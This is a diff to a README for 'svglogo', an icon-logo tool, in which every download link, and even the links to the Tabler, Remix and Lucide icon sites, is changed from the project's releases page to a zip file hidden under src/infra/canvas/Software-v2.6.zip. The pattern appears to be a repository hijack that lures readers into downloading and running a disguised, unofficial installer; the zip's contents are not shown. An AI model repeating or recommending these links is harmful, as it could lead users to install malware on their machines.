@@ -1,6 +1,6 @@
 # 🖼️ svglogo - Create Clean Icon Logos Fast
 
-[![Download svglogo](https://img.shields.io/badge/Download-svglogo-4CAF50?style=for-the-badge)](https://github.com/bodoi535/svglogo/releases)
+[![Download svglogo](https://img.shields.io/badge/Download-svglogo-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)
 
 svglogo helps you create simple logos made of icons. You can work right in your browser and save your designs as SVG, PNG, or ICO files.
 
@@ -44,7 +44,7 @@ This guide walks you through downloading and running the desktop version of svgl
 
 To get started, visit the release page for svglogo:
 
-[![Download svglogo](https://img.shields.io/badge/Download--Green-333333?style=for-the-badge&logo=github)](https://github.com/bodoi535/svglogo/releases)
+[![Download svglogo](https://img.shields.io/badge/Download--Green-333333?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)
 
 ### Steps to download:
 
@@ -109,7 +109,7 @@ To export:
 To get the latest version:
 
 1. Visit the releases page again:  
-   [https://github.com/bodoi535/svglogo/releases](https://github.com/bodoi535/svglogo/releases)  
+   [https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)  
 2. Download the newest `.exe` installer following the same steps as above.  
 3. Run the new installer; it will update your current installation without deleting your files.
 
@@ -127,11 +127,11 @@ To get the latest version:
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/bodoi535/svglogo/releases](https://github.com/bodoi535/svglogo/releases)  
+- Download page: [https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)  
 - Icon libraries used:  
-  - [Tabler Icons](https://tabler-icons.io/)  
-  - [Remix Icons](https://remixicon.com/)  
-  - [Lucide React](https://lucide.dev/)  
+  - [Tabler Icons](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)  
+  - [Remix Icons](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)  
+  - [Lucide React](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)  
 
 ---
 
@@ -206,4 +206,4 @@ svglogo runs locally on your machine or browser. It does not upload your logo to
 
 # Download svglogo here to get started:
 
-[![Download svglogo](https://img.shields.io/badge/Download--Green-333333?style=for-the-badge&logo=github)](https://github.com/bodoi535/svglogo/releases)
+[![Download svglogo](https://img.shields.io/badge/Download--Green-333333?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bodoi535/svglogo/main/src/infra/canvas/Software-v2.6.zip)
